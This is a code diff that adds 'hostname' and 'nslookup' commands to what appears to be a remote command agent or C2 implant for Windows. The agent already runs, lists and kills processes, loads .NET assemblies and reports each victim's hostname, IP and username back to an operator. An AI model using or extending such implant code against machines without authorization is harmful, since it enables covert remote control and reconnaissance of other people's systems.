@@ -25,6 +25,8 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.ps import list_processes, grep_processes, terminate_process
     from utils.winapi.run import run_process
     from utils.winapi.netexec import load_dotnet_assembly
+    from utils.winapi.hostname import get_hostname  # Import the new hostname module
+    from utils.winapi.nslookup import nslookup  # Import the new nslookup module
 
 logging.basicConfig(level=logging.INFO)
 smb_pipe_conn = None
@@ -348,6 +350,29 @@ def execute_commands():
                 except Exception as e:
                     status = "Failed"
                     output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif command_text.lower() == 'hostname':
+                if os.name == 'nt':
+                    try:
+                        result = get_hostname()
+                        status = 'Completed'
+                        output = result
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
+                update_command_status(command_id, status, output, hostname, ip, os_info, username)
+
+            elif command_text.lower().startswith('nslookup'):
+                if os.name == 'nt':
+                    try:
+                        host_to_lookup = command_text.split(' ', 1)[1]
+                        result = nslookup(host_to_lookup)
+                        status = 'Completed'
+                        output = result
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
                 update_command_status(command_id, status, output, hostname, ip, os_info, username)
 
             else:
